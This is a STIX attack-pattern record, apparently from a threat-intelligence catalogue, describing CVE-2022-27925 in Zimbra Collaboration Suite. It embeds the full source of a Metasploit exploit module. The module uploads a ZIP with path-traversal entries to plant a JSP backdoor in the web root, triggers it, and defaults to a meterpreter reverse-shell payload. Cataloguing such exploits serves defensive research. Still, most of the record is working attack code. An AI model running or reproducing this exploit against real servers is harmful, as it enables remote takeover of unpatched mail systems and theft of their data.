{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--69f93e7e-6537-4e13-a71a-bade6ec505c3",
    "created": "2024-08-14T17:00:21.289868Z",
    "modified": "2024-08-14T17:00:21.289873Z",
    "name": "Zip Path Traversal in Zimbra (mboximport) (CVE-2022-27925)",
    "description": " This module POSTs a ZIP file containing path traversal characters to the administrator interface for Zimbra Collaboration Suite. If successful, it plants a JSP-based backdoor within the web directory, then executes it.  The core vulnerability is a path-traversal issue in Zimbra Collaboration Suite's ZIP implementation that can result in the extraction of an arbitrary file to an arbitrary location on the host.  This issue is exploitable on the following versions of Zimbra:  * Zimbra Collaboration Suite Network Edition 9.0.0 Patch 23 (and earlier) * Zimbra Collaboration Suite Network Edition 8.8.15 Patch 30 (and earlier)  Note that the Open Source Edition is not affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/zimbra_mboximport_cve_2022_27925.rb",
            "external_id": "zimbra_mboximport_cve_2022_27925.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-27925"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-37042"
        },
        {
            "source_name": "reference",
            "url": "https://blog.zimbra.com/2022/03/new-zimbra-patches-9-0-0-patch-24-and-8-8-15-patch-31/"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ncas/alerts/aa22-228a"
        },
        {
            "source_name": "reference",
            "url": "https://www.yang99.top/index.php/archives/82/"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P24"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P31"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zip Path Traversal in Zimbra (mboximport) (CVE-2022-27925)',\n        'Description' => %q{\n          This module POSTs a ZIP file containing path traversal characters to\n          the administrator interface for Zimbra Collaboration Suite. If\n          successful, it plants a JSP-based backdoor within the web directory, then\n          executes it.\n\n          The core vulnerability is a path-traversal issue in Zimbra Collaboration Suite's\n          ZIP implementation that can result in the extraction of an arbitrary file\n          to an arbitrary location on the host.\n\n          This issue is exploitable on the following versions of Zimbra:\n\n          * Zimbra Collaboration Suite Network Edition 9.0.0 Patch 23 (and earlier)\n          * Zimbra Collaboration Suite Network Edition 8.8.15 Patch 30 (and earlier)\n\n          Note that the Open Source Edition is not affected.\n        },\n        'Author' => [\n          'Volexity Threat Research', # Initial writeup\n          \"Yang_99's Nest\", # PoC\n          'Ron Bowes', # Analysis / module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2022-27925'],\n          ['CVE', '2022-37042'],\n          ['URL', 'https://blog.zimbra.com/2022/03/new-zimbra-patches-9-0-0-patch-24-and-8-8-15-patch-31/'],\n          ['URL', 'https://www.cisa.gov/uscert/ncas/alerts/aa22-228a'],\n          ['URL', 'https://www.yang99.top/index.php/archives/82/'],\n          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P24'],\n          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P31'],\n        ],\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [ 'Zimbra Collaboration Suite', {} ]\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n          'TARGET_PATH' => '../../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbraAdmin/public/',\n          'TARGET_FILENAME' => nil,\n          'RPORT' => 7071,\n          'SSL' => true\n        },\n        'DefaultTarget' => 0,\n        'Privileged' => false,\n        'DisclosureDate' => '2022-05-10',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGET_PATH', [ true, 'The location the payload should extract to (can, and should, contain path traversal characters - \"../../\").']),\n        OptString.new('TARGET_FILENAME', [ false, 'The filename to write in the target directory; should have a .jsp extension (default: <random>.jsp).']),\n        OptString.new('TARGET_USERNAME', [ true, 'The target user, must be valid on the Zimbra server', 'admin']),\n      ]\n    )\n  end\n\n  # Generate an on-system filename using datastore options\n  def generate_target_filename\n    if datastore['TARGET_FILENAME'] && !datastore['TARGET_FILENAME'].end_with?('.jsp')\n      print_warning('TARGET_FILENAME does not end with .jsp, was that intentional?')\n    end\n\n    File.join(datastore['TARGET_PATH'], datastore['TARGET_FILENAME'] || \"#{Rex::Text.rand_text_alpha_lower(4..10)}.jsp\")\n  end\n\n  # Normalize the path traversal and figure out where it is relative to the web root\n  def zimbra_get_public_path(target_filename)\n    # Normalize the path\n    normalized_path = Pathname.new(File.join('/opt/zimbra/log', target_filename)).cleanpath\n\n    # Figure out where it is, relative to the webroot\n    webroot = Pathname.new('/opt/zimbra/jetty_base/webapps/')\n    relative_path = normalized_path.relative_path_from(webroot)\n\n    # Hopefully, we found a path from the webroot to the payload!\n    if relative_path.to_s.start_with?('../')\n      return nil\n    end\n\n    relative_path\n  end\n\n  def exploit\n    print_status('Encoding the payload as a .jsp file')\n    payload = Msf::Util::EXE.to_jsp(generate_payload_exe)\n\n    # Create a file\n    target_filename = generate_target_filename\n    print_status(\"Target filename: #{target_filename}\")\n\n    # Create a zip file\n    zip = Rex::Zip::Archive.new\n    zip.add_file(target_filename, payload)\n    data = zip.pack\n\n    print_status('Sending POST request with ZIP file')\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => \"/service/extension/backup/mboximport?account-name=#{datastore['TARGET_USERNAME']}&ow=1&no-switch=1&append=1\",\n      'data' => data\n    )\n\n    # Check the response\n    if res.nil?\n      fail_with(Failure::Unreachable, \"Could not connect to the target port (#{datastore['RPORT']})\")\n    elsif res.code == 404\n      fail_with(Failure::NotFound, 'The target path was not found, target is probably not vulnerable')\n    elsif res.code != 401\n      print_warning(\"Unexpected response from the target (expected HTTP/401, got HTTP/#{res.code}) - exploit likely failed\")\n    end\n\n    # Get the public path for triggering the vulnerability, terminate if we\n    # can't figure it out\n    public_filename = zimbra_get_public_path(target_filename)\n    if public_filename.nil?\n      fail_with(Failure::BadConfig, 'Could not determine the public web path, maybe you need to traverse further back?')\n    end\n\n    register_file_for_cleanup(target_filename)\n\n    print_status(\"Trying to trigger the backdoor @ #{public_filename}\")\n\n    # Trigger the backdoor\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(public_filename)\n    )\n\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Could not connect to trigger the payload')\n    elsif res.code == 200\n      print_good('Successfully triggered the payload')\n    elsif res.code == 404\n      fail_with(Failure::Unknown, \"Payload was not uploaded, the server probably isn't vulnerable\")\n    else\n      fail_with(Failure::Unknown, \"Could not connect to the server to trigger the payload: HTTP/#{res.code}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-05-10",
    "x_mitre_platforms": [
        "linux'"
    ]
}